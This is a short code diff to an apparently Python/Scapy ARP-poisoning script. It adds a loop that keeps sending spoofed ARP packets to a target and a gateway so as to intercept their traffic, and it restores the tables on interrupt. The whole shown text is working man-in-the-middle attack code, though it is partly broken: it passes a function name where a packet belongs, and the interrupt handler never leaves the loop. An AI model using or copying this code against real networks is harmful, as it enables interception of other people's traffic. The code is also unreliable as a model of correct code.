@@ -58,8 +58,18 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     
     print("[*] Benning the ARP poison. [CTRL -c to stop")
 
-    
+    while True:
+        try:
+            send(poison_target)
+            send(poison_gateway)
 
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    
+    print("[*] ARP poison attack finished")
+
+    return
 
 gateway_mac = get_mac(gateway_ip)
 
@@ -92,14 +102,3 @@ except KeyboardInterrupt:
     #restaura a rede
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
-
-    
-
-
-
-
-
-
-
-
-
